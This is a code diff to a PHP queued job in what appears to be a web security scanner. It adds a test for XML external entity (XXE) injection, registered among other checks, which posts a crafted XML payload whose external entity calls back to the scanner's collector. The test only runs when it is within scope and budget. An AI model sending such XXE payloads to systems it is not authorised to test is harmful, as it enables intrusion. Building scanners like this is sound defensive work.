@@ -9,6 +9,7 @@ use App\Models\CollaboratorHit;
 use App\Models\Scan;
 use App\Models\Workspace;
 use App\Security\AgenticRun;
+use App\Security\ApiOracles;
 use App\Security\AttackPoints;
 use App\Security\BudgetLedger;
 use App\Security\Checks;
@@ -528,6 +529,27 @@ class RunScan implements ShouldQueue
         return ['verdict' => 'nao_testado', 'finding' => null];
     }
 
+    private function xxeTest(string $path): void
+    {
+        if (! $this->aggressiveAllowed() || ! Scope::allows($this->scan->scope, 'POST', $path) || ! $this->budgetAllows(2)) {
+            return;
+        }
+        $callback = $this->callbackToken();
+        $routeToken = $callback['token'].'xxe'.substr(bin2hex(random_bytes(3)), 0, 5);
+        $entity = $callback['base'].'/api/colaborador/'.$routeToken;
+        $xml = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE egide [<!ENTITY xxe SYSTEM "'.$entity.'">]><egide><ping>&xxe;</ping></egide>';
+        $this->runner('/probe', ['path' => $path, 'method' => 'POST', 'raw' => $xml, 'content_type' => 'application/xml', 'direct' => true, 'markers' => []]);
+        $this->observe(false);
+        usleep(800000);
+        $hits = CollaboratorHit::where('token', $routeToken)->count();
+        $assessment = ApiOracles::xxeAssess($path, $hits);
+        $this->cover('InjectionCheck · XXE (entidade externa)', $path, $assessment['verdict']);
+        if ($assessment['finding']) {
+            $this->scan->findings()->create($assessment['finding']);
+            $this->scan->event('finding', 'XXE confirmada por callback', 'O parser XML em '.$path.' resolveu a entidade externa e chamou o coletor da Égide.', $assessment['finding']['evidence']);
+        }
+    }
+
     private function jwtAssess(string $token): array
     {
         $parts = explode('.', $token);
@@ -1043,6 +1065,7 @@ class RunScan implements ShouldQueue
         $this->softCheck('Prototype pollution', fn () => $this->prototypePollutionTest("/servicos/{$variant}/preferencias", "/servicos/{$variant}/preferencias"));
         $this->softCheck('Métodos de escrita', fn () => $this->verbMatrixTest("/servicos/{$variant}/reservas/ab12cd34"));
         $this->softCheck('Race condition', fn () => $this->raceTest("/servicos/{$variant}/resgatar"));
+        $this->softCheck('XXE (entidade externa)', fn () => $this->xxeTest("/servicos/{$variant}/importar"));
         foreach (["/servicos/{$variant}/busca?q=1", "/servicos/{$variant}/consulta?id=1", "/servicos/{$variant}/integrador?url=x",
             "/servicos/{$variant}/pedido?id=1", "/servicos/{$variant}/retorno?destino=/{$variant}/painel",
             "/servicos/{$variant}/arquivo?file=manual.pdf", "/servicos/{$variant}/clientes?filtro=ativos",
